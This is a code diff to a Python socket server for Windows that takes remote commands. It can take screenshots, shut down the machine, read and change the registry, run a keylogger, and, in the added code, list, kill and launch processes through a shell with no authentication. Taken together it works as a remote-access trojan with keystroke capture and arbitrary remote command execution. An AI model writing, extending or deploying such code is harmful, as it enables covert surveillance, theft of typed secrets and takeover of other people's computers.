@@ -7,6 +7,8 @@ import winreg as wr
 from pynput import keyboard
 import subprocess
 import re
+import psutil
+import signal
 # from .. import functions
 # from functions import *
 # from functions import regedit
@@ -23,6 +25,7 @@ REGISTRY_MSG = "!REGISTRY"
 KEYLOG_MSG = "!KEYLOG"
 GETAPP_MSG = "!GETAPP"
 KILLAPP_MSG = "!KILLAPP"
+PROCESS_MSG = "!PROCESS"
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((SERVER, PORT))
@@ -110,47 +113,117 @@ def deleteKey(path, delKey):
     except:
         return False
 
-def analyzeRegistry(msg):
+def analyzeRegistry(msg, connection):
     content = msg.split(',')
-    print(content)
+    # print(content)
     if content[0] == 'GETVAL':
         returnVal = getValue(content[1], content[2])
         if returnVal:
-            return f'The value at path {content[1]} is {returnVal}'
+            send(connection, f'The value at path {content[1]} is {returnVal}')
         else: 
-            return f'Cannot get value at path {content[1]}'
+            send(connection, f'Cannot get value at path {content[1]}')
     elif content[0] == 'SETVAL':
         returnVal = setValue(content[1], content[2], content[3], content[4])
         if returnVal:
-            return f'Value {content[2]} has been set to {content[4]}'
+            send(connection, f'Value {content[2]} has been set to {content[4]}')
         else:
-            return f'Error while setting value {content[2]}'
+            send(connection, f'Error while setting value {content[2]}')
     elif content[0] == 'CREATEVAL':
         returnVal = createValue(content[1], content[2], content[3], content[4])
         if returnVal:
-            return f'Created value {content[2]}'
+            send(connection, f'Created value {content[2]}')
         else:
-            return f'Error while creating value {content[2]}'
+            send(connection, f'Error while creating value {content[2]}')
     elif content[0] == 'DELETEVAL':
         returnVal = deleteValue(content[1], content[2])
         if returnVal:
-            return f'Deleted value {content[2]}'
+            send(connection, f'Deleted value {content[2]}')
         else:
-            return f'Error while deleting value {content[2]}'
+            send(connection, f'Error while deleting value {content[2]}')
     elif content[0] == 'CREATEKEY':
         returnVal = createKey(content[1], content[2])
         if returnVal:
-            return f'Created key {content[2]}'
+            send(connection, f'Created key {content[2]}')
         else:
-            return f'Error while creating key {content[2]}'
+            send(connection, f'Error while creating key {content[2]}')
     elif content[0] == 'DELETEKEY':
         returnVal = deleteKey(content[1], content[2])
         if returnVal:
-            return f'Deleted key {content[2]}'
+            send(connection, f'Deleted key {content[2]}')
         else:
-            return f'Error while deleting key {content[2]}'
+            send(connection, f'Error while deleting key {content[2]}')
     else:
-        return 'Invalid command'
+        send(connection, 'Invalid command')
+
+def getProcessList():
+    process_list = []
+    for proc in psutil.process_iter(['pid', 'name', 'num_threads']):
+        try:
+            process_info = {
+                'pid': proc.pid,
+                'name': proc.name,
+                'threads': proc.num_threads
+            }
+            process_list.append(process_info)
+        except psutil.NoSuchProcess:
+            pass
+    return (process_list, len(process_list)) 
+
+def killProcess(pid):
+    """Kills a process with the given pid.
+
+    Args:
+        pid (int): The process id of the process to kill.
+
+    Returns:
+        boolean: True if the process was killed, False otherwise.
+    """
+    try:
+        os.kill(pid, signal.SIGTERM)
+        return True
+    except:
+        return False
+
+def startProcess(process_name):
+    """Starts a process with the given name. Note: Dont need to provide the full path to the process if it is in the system path.
+
+    Args:
+        process_name (string): The name/path of the process to start.
+
+    Returns:
+        boolean: True if the process was started, False otherwise.
+    """    
+    try:
+        subprocess.Popen(process_name, shell=True)
+        return True
+    except:
+        return False
+
+def analyzeProcess(msg, connection):
+    content = msg.split(',')
+    if content[0] == "GETPROCESS":
+        process_list, list_len = getProcessList()
+        print(process_list)
+        send(connection, str(list_len))
+        for item in process_list:
+            send(connection, str(item["pid"]))
+            send(connection, str(item["name"]))
+            send(connection, str(item["threads"]))
+        print('Sent process list')
+    elif content[0] == "STARTPROCESS":
+        returnVal = startProcess(content[1])
+        if returnVal:
+            send(connection, f'Started process {content[1]}')
+        else:
+            send(connection, f'Error while starting process {content[1]}')
+    elif content[0] == "KILLPROCESS":
+        returnVal = killProcess(content[1])
+        if returnVal:
+            send(connection, f'Killed process with pid {content[1]}')
+        else:
+            send(connection, f'Error while killing process with pid {content[1]}')
+    else:
+        send(connection, 'Invalid command')
 
 def sendScreenShot(connection, address):
     print(f"[{address}] !SCREENSHOT")
@@ -245,9 +318,10 @@ def handle_client(connection, address):
             os.system("shutdown /s /t 1")
         elif msg == REGISTRY_MSG:
             command = receive(connection)
-            print(command)
-            result = analyzeRegistry(command)
-            send(connection, result)
+            analyzeRegistry(command, connection)
+        elif msg == PROCESS_MSG:
+            command = receive(connection)
+            analyzeProcess(command, connection)
         elif msg == KEYLOG_MSG:
             global keylogger_on
             if (not keylogger_on):
